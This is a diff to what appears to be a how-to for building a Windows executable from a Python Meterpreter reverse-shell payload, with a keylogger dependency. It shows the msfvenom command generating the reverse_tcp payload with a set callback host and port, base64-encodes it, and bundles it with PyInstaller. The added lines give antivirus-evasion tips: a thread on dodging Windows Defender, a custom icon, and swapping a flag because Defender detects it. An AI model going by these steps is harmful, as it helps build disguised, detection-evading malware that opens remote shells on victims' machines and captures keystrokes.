@@ -27,15 +27,22 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.2.10 LPORT=443 -f raw -o m
 pythonpayload.py | base64 
 Replace this string with the base64 string in mrtp.py
 
+Super helpful thread:
+https://www.reddit.com/r/HowToHack/comments/ghfkrh/pyinstaller_getting_picked_up_by_windows_defender/
+
 ## Bundeling
 Read this before starting: https://arcade.academy/tutorials/bundling_with_pyinstaller/index.html
 Install the necessary imports with
 <code>
 wine ~/.wine/drive_c/Python27/python.exe -m pip install pynput==1.0 #This is example for the keylogger
 </code>
-wine ~/.wine/drive_c/Python27/python.exe -m PyInstaller --onefile --noconsole --hidden-import=pynput mrtp.py 
+wine ~/.wine/drive_c/Python27/python.exe -m PyInstaller --onefile  -w --icon=icon.ico --hidden-import=pynput mrtp.py 
+
+Do not use the --noconsole flag for pyinstaller cause Windows Defender will pick it up
 The exe-file is in the dist folder
 Test it on wine with wine dist/mrtp.py
+
+
 
 # Sources: 
 - https://pentestmag.com/antivirus-evasion-with-python/
